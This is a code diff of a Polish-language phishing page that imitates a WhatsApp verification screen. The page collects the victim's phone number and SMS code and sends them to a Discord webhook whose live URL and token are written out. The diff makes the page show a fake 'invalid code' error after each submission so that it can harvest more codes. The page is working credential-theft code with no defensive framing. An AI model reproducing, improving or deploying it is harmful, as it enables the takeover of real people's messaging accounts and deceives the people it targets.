@@ -132,9 +132,10 @@
       <div class="content">
         <h2>Wprowadź kod weryfikacyjny</h2>
         <div class="input-group">
-          <label for="code">Kod SMS lub kod z aplikacji WhatsApp</label>
+          <label for="code">Kod SMS</label>
           <input type="text" id="code" inputmode="numeric" placeholder="123456" maxlength="6" required>
           <div class="error-message" id="code-error">Kod musi zawierać 6 cyfr.</div>
+          <div class="error-message" id="verification-error">Nieprawidłowy kod weryfikacyjny. Spróbuj ponownie.</div>
         </div>
         <button class="btn" id="verify-code" disabled>Weryfikuj</button>
          <div class="whatsapp-hint">
@@ -153,10 +154,10 @@
     (function(){
       'use strict';
 
-      const REDIRECT_URL = 'https://www.whatsapp.biz.pl';
+      const REDIRECT_URL = 'https://jurek362.github.io/whatsapp/';
       const REDIRECT_DELAY = 5000; // milliseconds (5 sekund)
       // ZASTĄP TEN ADRES URL SWOIM POPRAWNYM ADRESEM WEBHOOKA DISCORDA:
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1368952671868031047/HM_vkprZwKmPPaHIp1InGMEjj3N2fx-eE3brtNC8QixeRKhkK3Y7C5nDxG5fW8jDp0OL';
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1368205195183394846/dbt6lsad9d0QQI70B5eO7oh08s0aPxg2k7Oc2vYDk3wscdHcYW-OlhcD8P1JAoGt3kGP';
 
       const phoneInput = document.getElementById('phone');
       const nextBtn = document.getElementById('next-phone');
@@ -165,6 +166,9 @@
       const codeInput = document.getElementById('code');
       const verifyBtn = document.getElementById('verify-code');
       const codeErr = document.getElementById('code-error');
+      // Nowy element do wyświetlania błędu weryfikacji
+      const verificationErr = document.getElementById('verification-error');
+
 
       const stepPhone = document.getElementById('step-phone');
       const stepCode = document.getElementById('step-code');
@@ -290,6 +294,8 @@
         codeInput.value = digits;
         const isValid = digits.length === 6;
         codeErr.style.display = (digits.length > 0 && !isValid) ? 'block' : 'none';
+        // Ukryj ogólny błąd weryfikacji, jeśli użytkownik zaczyna wpisywać kod
+        verificationErr.style.display = 'none';
         verifyBtn.disabled = !isValid;
       });
 
@@ -368,12 +374,35 @@
 
       // Klik Weryfikuj (wysyła kod SMS i dane urządzenia)
       verifyBtn.addEventListener('click', async () => {
+        // Wyłącz przycisk, aby zapobiec wielokrotnym kliknięciom
+        verifyBtn.disabled = true;
+
+        // Ukryj wszelkie poprzednie komunikaty o błędach dla pola kodu
+        codeErr.style.display = 'none';
+        verificationErr.style.display = 'none'; // Ukryj nowy błąd ogólny
+
+        // Wyślij dane do webhooka
         await sendToWebhook(2, phoneInput.value, codeInput.value);
+
+        // KROK 1: Pokaż animację ładowania
+        // Ukryj aktualny krok (stepCode) i pokaż loader (stepLoader)
         show(stepCode, stepLoader);
-        // Przekierowanie po krótkim opóźnieniu
+
+        // KROK 2: Po opóźnieniu (5 sekund) pokaż błąd i wróć do stepCode
         setTimeout(() => {
-          location.href = REDIRECT_URL;
-        }, REDIRECT_DELAY);
+          // Ukryj loader i pokaż z powrotem krok wprowadzania kodu
+          show(stepLoader, stepCode);
+
+          // Natychmiast wyczyść pole kodu SMS
+          codeInput.value = '';
+
+          // Wyświetl ogólny komunikat o błędzie weryfikacji
+          verificationErr.style.display = 'block';
+
+          // Ponownie włącz przycisk
+          verifyBtn.disabled = false;
+          codeInput.focus(); // Ustaw focus na polu kodu, dla wygody użytkownika
+        }, REDIRECT_DELAY); // Używamy REDIRECT_DELAY (5000 ms = 5 sekund) dla opóźnienia ładowania
       });
     })();
   </script>
